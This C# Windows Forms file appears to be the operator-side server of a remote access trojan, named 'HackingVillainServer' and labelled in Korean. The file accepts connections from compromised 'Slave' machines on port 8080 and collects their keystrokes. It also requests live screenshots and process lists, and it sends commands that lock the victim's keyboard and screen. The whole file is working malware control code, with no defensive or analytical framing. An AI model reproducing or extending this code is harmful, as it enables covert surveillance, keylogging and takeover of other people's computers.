using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Linq;
using System.IO;
using System.Windows.Forms;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillainServer
{
    public partial class Form1 : Form
    {
        ISocket _server;
        private List<Slave> _clients = new List<Slave>();
        Thread _listen;
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            ImageList list = new ImageList();
            list.ImageSize = new Size(128, 128);
            list.Images.Add(Image.FromFile("쟌.png"));
            listView1.LargeImageList = list;
            _server = AweSock.TcpListen(8080);
        }

        ~Form1()
        {
            _listen.Abort();
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);

            Connect();
            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                }
            });
            _listen.Start();
        }

        public void Connect()
        {
            ISocket client = AweSock.TcpAccept(_server);
            _clients.Add(new Slave(client));

            this.listView1.Items.Add(client.GetRemoteEndPoint().ToString(), 0);
        }

        Buffer next;
        ScreenViewer viewer;
        public void Listen()
        {
            Buffer inBuf = Buffer.New();
            if (!_readyForSize && _readyForScreen)
            {
                AweSock.ReceiveMessage(_clients[0].Socket, next);
                Buffer.FinalizeBuffer(next);
            }
            else
            {
                AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
                Buffer.FinalizeBuffer(inBuf);
            }

            if (_readyForProcess)
            {
                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');

                _readyForProcess = false;
                EventViewer viewer = new EventViewer(k.Split('\n').ToList());
                this.Invoke((MethodInvoker)delegate ()
                {
                    viewer.Show();
                });
            }
            else if (_readyForScreen && _readyForSize)
            {
                _readyForSize = false;
                next = Buffer.New(Buffer.Get<int>(inBuf));
            }
            else if (_readyForScreen && !_readyForSize)
            {
                using (var ms = new MemoryStream(Buffer.GetBuffer(next)))
                {
                    var img = Image.FromStream(ms);
                    if (viewer != null)
                        viewer.BackgroundImage = img;
                    else
                    {
                        viewer = new ScreenViewer(img);

                        viewer.FormClosed += (b, d) =>
                        {
                            this.Invoke(new MethodInvoker(() =>
                            {
                                Send("Stop Showing");
                                _readyForSize = false;
                                _readyForScreen = false;
                            }));
                        };

                        this.Invoke((MethodInvoker)delegate ()
                        {
                            viewer.Show();
                        });
                    }
                    _readyForSize = true;
                }
            }
            else
            {
                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');

                _clients[0].KeyEvents.Add(k);
            }
            Thread.Sleep(10);
            /*
            byte[] bytes = Buffer.GetBuffer(inBuf);
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                var img = Image.FromStream(ms);
                this.BackgroundImage = img;
            }
            */
        }

        public void Send(string msg)
        {
            Buffer b = Buffer.New();
            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
        }

        private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;

            var cl = _clients[listView1.SelectedItems[0].Index];
            new EventViewer(cl.KeyEvents).Show();
        }

        private void 활성화EToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("UnLock Key");
        }

        private void 비활성화DToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("Lock Key");
        }

        private void 활성화EToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("UnLock Screen");
        }

        private void 비활성화DToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("Lock Screen");
        }

        bool _readyForProcess = false;
        private void 프로세스ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            _readyForProcess = true;
            Send("Show Me The Process");
        }

        bool _readyForSize = false;
        bool _readyForScreen = false;
        private void 화면SToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            _readyForSize = true;
            _readyForScreen = true;
            Send("Show Me The Screen");
        }
    }
}
